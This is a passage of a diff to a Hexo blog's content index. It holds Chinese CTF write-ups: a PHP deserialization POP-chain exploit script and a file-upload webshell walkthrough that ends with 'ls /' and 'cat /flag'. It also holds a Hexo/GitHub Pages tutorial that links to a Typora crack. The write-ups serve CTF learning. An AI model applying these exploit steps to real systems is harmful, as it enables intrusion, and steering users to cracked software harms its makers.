class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;发现没有东西，甚至连“nono”都没有，再查反序列化知识点，发现有个知识点很契合题目“pop”：pop链序列化</p>
+<p>&emsp;&emsp;<strong>pop链序列化</strong>：利用魔法方法在里面进行多次跳转，pop链的尾部是关键属性或漏洞函数，从尾至头递推</p>
+<p>&emsp;&emsp;于是重新分析PHP代码，以获得flag为目的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获得flag：验证admin=&quot;w44m&quot;&amp;&amp;passwd=&quot;08067&quot;</span><br><span class="line">验证admin=&quot;w44m&quot;&amp;&amp;passwd=&quot;08067&quot;：调用Getflag()</span><br><span class="line">调用Getflag()：w33m中调用$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;()</span><br><span class="line">w33m中调用$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;()：__toString()调用</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;这里出现了疑惑：__toString()魔术方法在什么时候能够被调用？</p>
+<table>
+<thead>
+<tr>
+<th align="center">调用前提</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">对象被当作字符串处理</td>
+<td align="center">当对象需要使用<code>echo</code>、<code>print</code>语句输出，或在字符串连接操作（如使用<code>.</code>运算符）中涉及对象时，<code>__toString()</code>方法会被自动调用。</td>
+</tr>
+<tr>
+<td align="center">方法存在于类中</td>
+<td align="center"><code>__toString()</code>方法必须在类中显式定义。如果类中未定义此方法，而对象又被当作字符串处理，则会抛出一个<code>Catchable fatal error</code>错误。</td>
+</tr>
+<tr>
+<td align="center">适用于所有需要将对象转为字符串的场景</td>
+<td align="center">在任何需要将对象转换为字符串的场景中，如果定义了<code>__toString()</code>方法，PHP都会尝试调用它来完成转换。这包括函数调用参数需要字符串类型、文件写入操作需要字符串数据等。</td>
+</tr>
+</tbody></table>
+<p>&emsp;&emsp;这就很明白了，可以续上pop链了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__toString()调用：echo $this-&gt;w00m调用</span><br><span class="line">echo $this-&gt;w00m调用：w22m的__destruct()调用，即其被析构</span><br><span class="line">w22m的__destruct()调用：w22m的创建</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;综上，最外层应当创建w22m的对象，且相应参数应如下</p>
+<table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th align="center">值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">w22m：w00m，s:4:”w00m”;</td>
+<td align="center">类w33m的实例</td>
+</tr>
+<tr>
+<td align="center">w33m：w00m，s:4:”w00m”;</td>
+<td align="center">类w44m的实例</td>
+</tr>
+<tr>
+<td align="center">w33m：w22m，s:4:”w22m”;</td>
+<td align="center">s:7:”Getflag”;</td>
+</tr>
+<tr>
+<td align="center">w44m：admin，s:5:”\00w44m\00admin”;</td>
+<td align="center">s:4:”w44m”;</td>
+</tr>
+<tr>
+<td align="center">w44m：passwd，s:6:”\00*\00passwd”;</td>
+<td align="center">s:5:”08067”;</td>
+</tr>
+</tbody></table>
+<p>&emsp;&emsp;这里就不自己推序列化字串了，用.php脚本自己跑，代码如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w22m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w33m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w44m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w22m = <span class="string">&quot;Getflag&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;结算画面(ﾉ･ｪ･)ﾉ(ﾉ･ｪ･)ﾉ(ﾉ･ｪ･)ﾉ</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/440_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="440_结果展示">
+
+<h2><span id="3867_litctf-2023作业管理系统-文件上传">3867_[LitCTF 2023]作业管理系统 –文件上传</span></h2><p>&emsp;&emsp;进入环境，F12网页检查，发现出现提示信息<code>&lt;!--默认账户admin admin--&gt;</code>，输入后得到下一界面</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/3867_%E7%AC%AC%E4%BA%8C%E7%95%8C%E9%9D%A2.png" class title="3867_第二界面">
+
+<p>&emsp;&emsp;看左侧的功能框，推测是文件上传的知识点，上传个一句话木马试试水<code>&lt;?php phpinfo();?&gt;</code>，然后直接访问上传上去的文件</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/3867_phpinfo.png" class title="3867_phpinfo">
+
+<p>&emsp;&emsp;好吧，接着试呗，<code>ls /</code></p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/3867_ls.png" class title="3867_ls">
+
+<p>&emsp;&emsp;剩下就简单了，<code>cat /flag</code>出现答案</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/3867_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="3867_结果展示">
 ]]></content>
       <categories>
         <category>CTF Learning</category>
@@ -919,105 +1182,6 @@
       <tags>
         <tag>CTF-Web</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>第一篇博客献给建博客的自己</title>
-    <url>/2024/10/16/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<h1><span id="利用hexo和github-pages搭建个人博客">利用Hexo和GitHub Pages搭建个人博客</span></h1><p>&emsp;&emsp;博主在利用Hexo和GitHub Pages创建本博客网站时，几经波折得以建成，又几经波折得以发送出人生中第一篇博客。现将流程及所遇问题梳理如下，唯望前人栽树，后人乘凉。</p>
-<span id="more"></span>
-
-<!-- toc -->
-
-<ul>
-<li><a href="#1-%E9%A2%84%E5%A4%87%E5%B7%A5%E4%BD%9C">1、预备工作</a></li>
-<li><a href="#2-%E5%88%9D%E5%A7%8B%E5%8C%96github%E4%BB%93%E5%BA%93">2、初始化GitHub仓库</a></li>
-<li><a href="#3-%E5%88%9D%E5%A7%8B%E5%8C%96hexo">3、初始化Hexo</a></li>
-<li><a href="#4-%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2">4、实现远程部署</a></li>
-<li><a href="#5-%E4%BD%BF%E7%94%A8%E6%9B%B4%E7%BE%8E%E8%A7%82%E7%9A%84%E4%B8%BB%E9%A2%98%E5%8F%AF%E9%80%89">5、使用更美观的主题（可选）</a></li>
-<li><a href="#6-%E5%8F%91%E8%A1%A8%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2">6、发表第一篇博客</a></li>
-<li><a href="#7-%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E6%8A%A5%E9%94%99%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">7、可能出现的报错及解决方案</a></li>
-</ul>
-<!-- tocstop -->
-
-<h2><span id="1-预备工作">1、预备工作</span></h2><p>&emsp;&emsp;环境准备：安装<span style="background-color: yellow;">Node.js</span>，用于使用npm包管理器，附官网 <a href="https://nodejs.org/en">https://nodejs.org/en</a></p>
-<p>&emsp;&emsp;工具准备：安装<span style="background-color: yellow;">Git</span>，用于远程拉取和上传，附官网<a href="https://git-scm.com/">https://git-scm.com/</a></p>
-<p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;安装<span style="background-color: yellow;">VsCode</span>，用于后期修改代码，附官网<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
-<p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;安装<span style="background-color: yellow;">Typora</span>，用于更方便的编写Markdown文档，需收费，附官网<a href="https://typora.io/">https://typora.io/</a></p>
-<p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;(可以逃课，CSDN博主阿辉的日常：<a href="https://blog.csdn.net/qq_56746297/article/details/141232176?ops_request_misc=&request_id=&biz_id=102&utm_term=typora%E7%A0%B4%E8%A7%A3%E7%89%88%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduweb~default-0-141232176.nonecase&spm=1018.2226.3001.4450">Typora2024最新版破解方法（博主亲测可用）</a>)</p>
-<p>&emsp;&emsp;账号准备：注册<span style="background-color: yellow;">GitHub账号</span>，用来搭建仓库，附官网<a href="https://github.com/">https://github.com/</a></p>
-<p>&emsp;&emsp;前置知识：知晓<span style="background-color: yellow;">Markdown语法</span>、有HTML基础会好</p>
-<h2><span id="2-初始化github仓库">2、初始化GitHub仓库</span></h2><p>&emsp;&emsp;创建GitHub仓库：进入自己的GitHub账号主页，在Repositories中找到“New”跳转到仓库创建页面</p>
-<hr>
-<p>&emsp;&emsp;<img src="/2024/10/16/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93.png" class title="创建仓库"></p>
-<hr>
-<p>&emsp;&emsp;如图进行填写勾选，<span style="background-color: red;">注</span>：Repository name处必须填“<span style="background-color: yellow;">账号名字.github.io</span>”</p>
-<h2><span id="3-初始化hexo">3、初始化Hexo</span></h2><p>&emsp;&emsp;[1]、在电脑选一个喜欢的位置，新建一个文件夹作为博客文件夹，比如博主的博客就建在：D:\Blog</p>
-<p>&emsp;&emsp;[2]、该目录下点击上方地址栏，输入cmd，打开命令行窗口，输入以安装Hexo：<span style="background-color: yellow;">npm i hexo-cli -g</span></p>
-<p>&emsp;&emsp;[3]、同样是该窗口，输入：<span style="background-color: yellow;">npm install</span>，下载依赖</p>
-<p>&emsp;&emsp;[4]、安装完成后即可初始化Hexo：<span style="background-color: yellow;">hexo init</span></p>
-<p>&emsp;&emsp;恭喜你，到这一步你已经可以在本地运行你的博客了，不要关闭命令行窗口，输入：<span style="background-color: yellow;">hexo s</span>看看成果</p>
-<p>&emsp;&emsp;虽然很丑而且还不能远程访问，不过果子得一口口吃，都会有的</p>
-<h2><span id="4-实现远程部署">4、实现远程部署</span></h2><p>&emsp;&emsp;这一步，我们要使自己的博客能够被远程访问，即通过网址让他人能看到你的博客，最终效果就是你可以在离我不知道多远的地方看我的文章๑乛◡乛๑</p>
-<p>&emsp;&emsp;[1]、同样，我们不需要关闭命令行窗口(当然如果你关闭了，重新打开就是了)，输入：<span style="background-color: yellow;">ssh</span>，检查ssh是否可用</p>
-<p>&emsp;&emsp;[2]、无异常后，输入两行代码，让Git知道你的GitHub账号信息：</p>
-<p>&emsp;&emsp;<code>git config --global user.name &quot;GitHub账号名&quot; </code></p>
-<p>&emsp;&emsp;<code>git config --global user.email &quot;GitHub账号注册邮箱&quot;</code></p>
-<p>&emsp;&emsp;[3]、在本地创建ssh秘钥，输入：</p>
-<p>&emsp;&emsp;<code>ssh-keygen -t rsa -C &quot;GitHub账号注册邮箱&quot;</code></p>
-<p>&emsp;&emsp;程序会出现三次暂停等候输入，不用理会直接跳过。随后会出现如下界面：</p>
-<hr>
-<p>&emsp;&emsp;<img src="/2024/10/16/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E5%88%9B%E5%BB%BAssh%E5%AF%86%E9%92%A5.png" class title="创建ssh密钥"></p>
-<hr>
-<p>&emsp;&emsp;[4]、完成后，根据上图第三行代码括号中路径，找到<span style="background-color: orange;">id_rsa.pub</span>文件，用记事本打开，复制密钥</p>
-<p>&emsp;&emsp;[5]、来到GitHub个人主页，点击右上方个人账号头像，找到“Settings”，接着点击“SSH and GPG keys”</p>
-<p>&emsp;&emsp;[6]、界面右侧会有绿色按钮“New SSH key”，点击，密钥名字任意，然后在“Key”处输入复制的密钥</p>
-<p>&emsp;&emsp;[7]、密钥生成后，可以在原命令行窗口输入以检查是否有异：</p>
-<p>&emsp;&emsp;<code>ssh git@github.com</code></p>
-<p>&emsp;&emsp;密钥密钥，自然是保护用的，密钥生成使用后，GitHub便只允许本地有私钥文件的电脑进行内容推送，你的博客才不会被随意篡改</p>
-<p>&emsp;&emsp;[8]、闲谈结束，接下来我们要让博客被推送到GitHub仓库中，首先下载必需插件：<span style="background-color: yellow;">npm install hexo-deployer-git –save</span></p>
-<p>&emsp;&emsp;[9]、打开你的博客文件夹，找到<span style="background-color: orange;">_config.yml</span>文件，，用准备好的VsCode打开。这是博客的配置文件，之后的样式、文字、功能等修改都需要在此对代码进行修改</p>
-<p>&emsp;&emsp;[10]、ctrl+快捷键搜索：<span style="background-color: yellow;">deploy</span>，并将此处代码修改为如下图示例：</p>
-<hr>
-<p>&emsp;&emsp;<img src="/2024/10/16/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E4%BB%A3%E7%A0%81%E7%A4%BA%E8%8C%831.png" class title="代码示范"></p>
-<hr>
-<p>&emsp;&emsp;显然，在“repo”这一行，大家应修改为：</p>
-<p>&emsp;&emsp;<code>git@github.com:GitHub账号名/GitHub账号名.github.io.git</code></p>
-<p>&emsp;&emsp;[11]、在原命令行窗口下，生成静态文件，输入：<span style="background-color: yellow;">hexo g</span></p>
-<p>&emsp;&emsp;[12]、上传到GitHub，输入：<span style="background-color: yellow;">hexo d</span></p>
-<p>&emsp;&emsp;如果你成功完成了上述十二步，现在是享受劳动成果的时候了，<span style="background-color: yellow;">https:&#x2F;&#x2F;账号名.github.io</span>，这就是专属于你的博客网址啦！&lt;(￣︶￣)&gt;</p>
-<h2><span id="5-使用更美观的主题可选">5、使用更美观的主题（可选）</span></h2><p>&emsp;&emsp;有点丑，至少我是这么想的。来选个好看的主题吧，博主这里推荐Next主体和Butterfly主体，博主会以自身博客为例，讲解下载、使用Next主题。</p>
-<p>&emsp;&emsp;[1]、打开GitHub，在搜索框搜索：<span style="background-color: yellow;">hexo next</span>，没错，这是GitHub大佬的杰作，点击“Code”，下载zip压缩包，解压到博客文件夹中的“theme”目录下</p>
-<p>&emsp;&emsp;[2]、在博客文件夹目录的<span style="background-color: orange;">_config.yml</span>文件修改配置theme：</p>
-<p>&emsp;&emsp;<code>theme: next</code></p>
-<p>&emsp;&emsp;可以先在本地运行一下博客看看有没有成功更换主题，没忘吧•⌄•(忘了就参考第三板块倒数第二句)</p>
-<p>&emsp;&emsp;[3]、当然，Next主体可更改的属性有很多，博主也还在学习怎么把博客变得更个性化，不过这不是有大佬嘛，推荐CSDN博主ywang_wnlo：<a href="https://blog.csdn.net/CoolBoySilverBullet/article/details/121719830?ops_request_misc=%257B%2522request%255Fid%2522%253A%25226298D213-4C23-421C-88C8-99A1DE4019D6%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=6298D213-4C23-421C-88C8-99A1DE4019D6&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduend~default-1-121719830-null-null.nonecase&utm_term=hexonext&spm=1018.2226.3001.4450">【Hexo】NexT 主题的配置使用记录</a></p>
-<h2><span id="6-发表第一篇博客">6、发表第一篇博客</span></h2><p>&emsp;&emsp;来吧，发篇博客体验一下，打开你的Typora开始写文咯，这里我将讲述我新建文章的方法</p>
-<p>&emsp;&emsp;[1]、新建一个.md文件，在利用Typora完成编写后，将文件另存到：<span style="background-color: yellow;">hexo next博客文件夹&#x2F;source&#x2F;_posts&#x2F;</span></p>
-<p>&emsp;&emsp;[2]、在博客文件夹下通过cmd命令打开命令行窗口，依次输入以下三行代码，我简称为“三板斧”：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean </span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;通过上述三行代码，你的Hexo博客和GitHub仓库会被更新，写好的md文件也会挂在博客上</p>
-<p>&emsp;&emsp;<span style="background-color: red;">注</span>：在每次修改博客文件夹中内容后，都需运行一遍“三板斧”，才会在博客中生效</p>
-<h2><span id="7-可能出现的报错及解决方案">7、可能出现的报错及解决方案</span></h2><p>&emsp;&emsp;来说说我目前在建博客上碰到的壁，满满血泪史(Ｔ▽Ｔ)</p>
-<p>&emsp;&emsp;[1]、在使用npm包管理器下载<span style="background-color: yellow;">hexo-cli</span>时卡住，可尝试两种手段</p>
-<p>&emsp;&emsp;&emsp;①、修改npm源为阿里的镜像源，不使用国外服务器：</p>
-<p>&emsp;&emsp;&emsp;<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
-<p>&emsp;&emsp;&emsp;②、未下载依赖：<span style="background-color: yellow;">npm install</span></p>
-<p>&emsp;&emsp;随后重新进行<span style="background-color: yellow;">hexo-cli</span>下载，即重新进行3~[2]，若使用手段①，只需将命令开头的npm改为<span style="background-color: yellow;">cnpm</span></p>
-<p>&emsp;&emsp;[2]、检查自己创建的仓库是不是公开的，即“Public”，若不是，在该步骤会出现问题：4~[12]</p>
-<p>&emsp;&emsp;[3]、一定是根据4~[5]找到“Settings”，而不是在仓库的“Settings”中的“Deploy keys”中操作</p>
-<p>&emsp;&emsp;以下是在写文章时遇到的问题(っ╥╯﹏╰╥c)</p>
-<p>&emsp;&emsp;[4]、如果你想根据标题建立目录，不要使用Typora的一键目录，使用：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--toc--&gt;</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;[5]、不知为何，当使用Markdown文件的高亮语法“&#x3D;&#x3D;高亮内容&#x3D;&#x3D;”时，Hexo上无法显示，这里可以直接使用HTML语法：</p>
-<p>&emsp;&emsp;<code>&lt;span style=&quot;background-color: yellow;&quot;&gt;高亮内容&lt;/span&gt;</code></p>
-<p>&emsp;&emsp;[6]、为了插入图片，我也同样撞了两次壁，查了百度，查了CSDN，找到成功方案，以下使用C++注释风格：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//在博客文件夹的_config.yml文件修改</span><br><span class="line">post_asset_folder: true</span><br><span class="line">marked:</span><br><span class="line">  prependRoot: true</span><br><span class="line">  postAsset: true</span><br><span class="line">//在博客文件夹下打开命令行窗口，安装新插件</span><br><span class="line">npm install hexo-asset-img --save</span><br><span class="line">//在/source/_posts/中建立一个同md文件相同名字的文件夹，将图片存放进去</span><br><span class="line">//插入图片的语法</span><br><span class="line">！[图片](图片路径/网络链接 &quot;Title&quot;) //路径可使用相对路径</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;看到这里，肯定有些人没有找到想要的解决方案，没关系，CSDN嘛，总会找到的，期待你的博客！</p>
-<p>&emsp;&emsp;╭（′▽‵）╭（′▽‵）╭（′▽‵）╯</p>
-]]></content>
   </entry>
   <entry>
     <title>Python第三方库学习笔记-NumPy</title>
@@ -1147,5 +1311,104 @@
       <tags>
         <tag>Python</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>第一篇博客献给建博客的自己</title>
+    <url>/2024/10/16/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h1><span id="利用hexo和github-pages搭建个人博客">利用Hexo和GitHub Pages搭建个人博客</span></h1><p>&emsp;&emsp;博主在利用Hexo和GitHub Pages创建本博客网站时，几经波折得以建成，又几经波折得以发送出人生中第一篇博客。现将流程及所遇问题梳理如下，唯望前人栽树，后人乘凉。</p>
+<span id="more"></span>
+
+<!-- toc -->
+
+<ul>
+<li><a href="#1-%E9%A2%84%E5%A4%87%E5%B7%A5%E4%BD%9C">1、预备工作</a></li>
+<li><a href="#2-%E5%88%9D%E5%A7%8B%E5%8C%96github%E4%BB%93%E5%BA%93">2、初始化GitHub仓库</a></li>
+<li><a href="#3-%E5%88%9D%E5%A7%8B%E5%8C%96hexo">3、初始化Hexo</a></li>
+<li><a href="#4-%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2">4、实现远程部署</a></li>
+<li><a href="#5-%E4%BD%BF%E7%94%A8%E6%9B%B4%E7%BE%8E%E8%A7%82%E7%9A%84%E4%B8%BB%E9%A2%98%E5%8F%AF%E9%80%89">5、使用更美观的主题（可选）</a></li>
+<li><a href="#6-%E5%8F%91%E8%A1%A8%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2">6、发表第一篇博客</a></li>
+<li><a href="#7-%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E6%8A%A5%E9%94%99%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">7、可能出现的报错及解决方案</a></li>
+</ul>
+<!-- tocstop -->
+
+<h2><span id="1-预备工作">1、预备工作</span></h2><p>&emsp;&emsp;环境准备：安装<span style="background-color: yellow;">Node.js</span>，用于使用npm包管理器，附官网 <a href="https://nodejs.org/en">https://nodejs.org/en</a></p>
+<p>&emsp;&emsp;工具准备：安装<span style="background-color: yellow;">Git</span>，用于远程拉取和上传，附官网<a href="https://git-scm.com/">https://git-scm.com/</a></p>
+<p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;安装<span style="background-color: yellow;">VsCode</span>，用于后期修改代码，附官网<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
+<p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;安装<span style="background-color: yellow;">Typora</span>，用于更方便的编写Markdown文档，需收费，附官网<a href="https://typora.io/">https://typora.io/</a></p>
+<p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;(可以逃课，CSDN博主阿辉的日常：<a href="https://blog.csdn.net/qq_56746297/article/details/141232176?ops_request_misc=&request_id=&biz_id=102&utm_term=typora%E7%A0%B4%E8%A7%A3%E7%89%88%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduweb~default-0-141232176.nonecase&spm=1018.2226.3001.4450">Typora2024最新版破解方法（博主亲测可用）</a>)</p>
+<p>&emsp;&emsp;账号准备：注册<span style="background-color: yellow;">GitHub账号</span>，用来搭建仓库，附官网<a href="https://github.com/">https://github.com/</a></p>
+<p>&emsp;&emsp;前置知识：知晓<span style="background-color: yellow;">Markdown语法</span>、有HTML基础会好</p>
+<h2><span id="2-初始化github仓库">2、初始化GitHub仓库</span></h2><p>&emsp;&emsp;创建GitHub仓库：进入自己的GitHub账号主页，在Repositories中找到“New”跳转到仓库创建页面</p>
+<hr>
+<p>&emsp;&emsp;<img src="/2024/10/16/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93.png" class title="创建仓库"></p>
+<hr>
+<p>&emsp;&emsp;如图进行填写勾选，<span style="background-color: red;">注</span>：Repository name处必须填“<span style="background-color: yellow;">账号名字.github.io</span>”</p>
+<h2><span id="3-初始化hexo">3、初始化Hexo</span></h2><p>&emsp;&emsp;[1]、在电脑选一个喜欢的位置，新建一个文件夹作为博客文件夹，比如博主的博客就建在：D:\Blog</p>
+<p>&emsp;&emsp;[2]、该目录下点击上方地址栏，输入cmd，打开命令行窗口，输入以安装Hexo：<span style="background-color: yellow;">npm i hexo-cli -g</span></p>
+<p>&emsp;&emsp;[3]、同样是该窗口，输入：<span style="background-color: yellow;">npm install</span>，下载依赖</p>
+<p>&emsp;&emsp;[4]、安装完成后即可初始化Hexo：<span style="background-color: yellow;">hexo init</span></p>
+<p>&emsp;&emsp;恭喜你，到这一步你已经可以在本地运行你的博客了，不要关闭命令行窗口，输入：<span style="background-color: yellow;">hexo s</span>看看成果</p>
+<p>&emsp;&emsp;虽然很丑而且还不能远程访问，不过果子得一口口吃，都会有的</p>
+<h2><span id="4-实现远程部署">4、实现远程部署</span></h2><p>&emsp;&emsp;这一步，我们要使自己的博客能够被远程访问，即通过网址让他人能看到你的博客，最终效果就是你可以在离我不知道多远的地方看我的文章๑乛◡乛๑</p>
+<p>&emsp;&emsp;[1]、同样，我们不需要关闭命令行窗口(当然如果你关闭了，重新打开就是了)，输入：<span style="background-color: yellow;">ssh</span>，检查ssh是否可用</p>
+<p>&emsp;&emsp;[2]、无异常后，输入两行代码，让Git知道你的GitHub账号信息：</p>
+<p>&emsp;&emsp;<code>git config --global user.name &quot;GitHub账号名&quot; </code></p>
+<p>&emsp;&emsp;<code>git config --global user.email &quot;GitHub账号注册邮箱&quot;</code></p>
+<p>&emsp;&emsp;[3]、在本地创建ssh秘钥，输入：</p>
+<p>&emsp;&emsp;<code>ssh-keygen -t rsa -C &quot;GitHub账号注册邮箱&quot;</code></p>
+<p>&emsp;&emsp;程序会出现三次暂停等候输入，不用理会直接跳过。随后会出现如下界面：</p>
+<hr>
+<p>&emsp;&emsp;<img src="/2024/10/16/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E5%88%9B%E5%BB%BAssh%E5%AF%86%E9%92%A5.png" class title="创建ssh密钥"></p>
+<hr>
+<p>&emsp;&emsp;[4]、完成后，根据上图第三行代码括号中路径，找到<span style="background-color: orange;">id_rsa.pub</span>文件，用记事本打开，复制密钥</p>
+<p>&emsp;&emsp;[5]、来到GitHub个人主页，点击右上方个人账号头像，找到“Settings”，接着点击“SSH and GPG keys”</p>
+<p>&emsp;&emsp;[6]、界面右侧会有绿色按钮“New SSH key”，点击，密钥名字任意，然后在“Key”处输入复制的密钥</p>
+<p>&emsp;&emsp;[7]、密钥生成后，可以在原命令行窗口输入以检查是否有异：</p>
+<p>&emsp;&emsp;<code>ssh git@github.com</code></p>
+<p>&emsp;&emsp;密钥密钥，自然是保护用的，密钥生成使用后，GitHub便只允许本地有私钥文件的电脑进行内容推送，你的博客才不会被随意篡改</p>
+<p>&emsp;&emsp;[8]、闲谈结束，接下来我们要让博客被推送到GitHub仓库中，首先下载必需插件：<span style="background-color: yellow;">npm install hexo-deployer-git –save</span></p>
+<p>&emsp;&emsp;[9]、打开你的博客文件夹，找到<span style="background-color: orange;">_config.yml</span>文件，，用准备好的VsCode打开。这是博客的配置文件，之后的样式、文字、功能等修改都需要在此对代码进行修改</p>
+<p>&emsp;&emsp;[10]、ctrl+快捷键搜索：<span style="background-color: yellow;">deploy</span>，并将此处代码修改为如下图示例：</p>
+<hr>
+<p>&emsp;&emsp;<img src="/2024/10/16/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E4%BB%A3%E7%A0%81%E7%A4%BA%E8%8C%831.png" class title="代码示范"></p>
+<hr>
+<p>&emsp;&emsp;显然，在“repo”这一行，大家应修改为：</p>
+<p>&emsp;&emsp;<code>git@github.com:GitHub账号名/GitHub账号名.github.io.git</code></p>
